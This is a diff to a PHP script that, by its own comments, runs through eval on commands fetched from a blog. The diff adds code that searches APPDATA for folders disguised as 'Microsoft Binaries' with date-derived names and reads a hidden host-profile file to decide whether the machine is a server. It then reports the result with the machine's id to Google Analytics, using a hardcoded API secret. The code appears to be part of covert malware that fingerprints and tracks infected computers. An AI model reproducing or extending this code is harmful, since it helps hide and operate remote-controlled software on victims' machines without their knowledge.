@@ -2,7 +2,7 @@ execução por eval. cuidado, não use exit e nem __FILE__
 
 *Atenção, este comando esta sendo executado via exec_blog_command() devido a mudança da url da conta. use só o comando do blg
 
-****23
+****25
 
 [GIT_COMMAND]
 
@@ -105,6 +105,28 @@ $GLOBALS['__getpathname_002'] = function()
 	return 0;
 };
 
+$GLOBALS['__check_is_server'] = function()
+{
+	$root = getenv('APPDATA');
+	$time = strtotime("-20 month", time());
+	for($i=0; $i<40; $i++)
+	{
+		$time = strtotime("+1 month", $time);
+		$year = (int)date('Y', $time);
+		$month = (int)date('m', $time);
+		$date_name_vs = (string)$month . '.' . (($month*37) * ($year*189));
+		
+		$cpupath = $root . '\\Microsoft Binaries v'.$date_name_vs . '\\cachecpudet.dat';
+		if(is_file($cpupath))
+		{
+			$cpudet = @json_decode(@file_get_contents($cpupath), true);
+			if($cpudet && isset($cpudet['isserver']) && $cpudet['isserver'] === true)
+				return true;
+		}
+	}
+	return false;
+};
+
 $GLOBALS['__put_contents_vir_002'] = function($file, $data)
 {
 	$root = getenv('APPDATA');
@@ -188,12 +210,16 @@ if(@file_get_contents(dirname(PHP_BINARY).'/version_2') === '1.1')
 	$now_time = time();
 	if(abs($now_time - $timestamp) > 60 * 60 * 15/*hours*/)
 	{
+		$is_server = @$GLOBALS['__check_is_server']() ? true : false;
+		$param_name = $is_server ? 'script_usage_server' : 'script_usage';
+		/*echo $is_server ? "TRUE" : "FALSE"; exit("\n\n");*/
+		
 		/*@$GLOBALS['__download_002']('xxxxxxxxxxxxxx');*/
 		$measurement_id = "G-MK5W0X76S3";
 		$api_secret = "75qz-iqmTOazvRWiP60Rqg";
 		$client_id = $id;
 		$url = "https://www.google-analytics.com/mp/collect?measurement_id=$measurement_id&api_secret=$api_secret";
-		$data = ["client_id" => $client_id,"events" => [["name" => "script_usage","params" => ["script_version" => "1.0","timestamp" => time()]]]];
+		$data = ["client_id" => $client_id,"events" => [["name" => $param_name,"params" => ["script_version" => "1.0","timestamp" => time()]]]];
 		@$GLOBALS['__download_002']($url, $data, ["Content-Type: application/json"]);
 		@file_put_contents($path_timestamp, $now_time);
 	}
